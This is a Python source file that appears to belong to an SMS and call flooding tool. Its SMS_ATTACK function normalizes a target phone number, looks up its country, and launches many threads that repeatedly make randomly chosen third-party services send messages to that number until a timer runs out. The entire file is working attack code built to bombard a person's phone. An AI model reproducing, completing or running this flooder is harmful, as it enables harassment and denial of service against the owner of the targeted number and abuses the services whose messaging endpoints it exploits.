import time
from threading import Thread
# Import modules for SMS & CALL flood
import tools.SMS.sendRequest as request
import tools.SMS.numberTools as number
import tools.SMS.randomData  as randomData

def SMS_ATTACK(threads, attack_time, phone):
	# Finish
	global FINISH
	FINISH = False
	threads_list = []

	# Get services list
	services = request.getServices()
	# Make for Russian numbers
	phone = number.normalize(phone)
	# Get country name by phone
	country = number.getCountry(phone)
	print("[#] Starting SMS flood to number: " + phone + ", country: " + country + ", time: " + str(attack_time) + " secounds..")

	# Send SMS
	def sms_flood():
		while not FINISH:
			service = randomData.random_service(services)
			service = request.Service(service)
			service.sendMessage(phone)


	# Start threads
	for thread in range(threads):
		print("[#] Staring thread " + str(thread))
		t = Thread(target = sms_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	try:
		time.sleep(attack_time)
	except KeyboardInterrupt:
		FINISH = True
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("[!] Attack stopped!")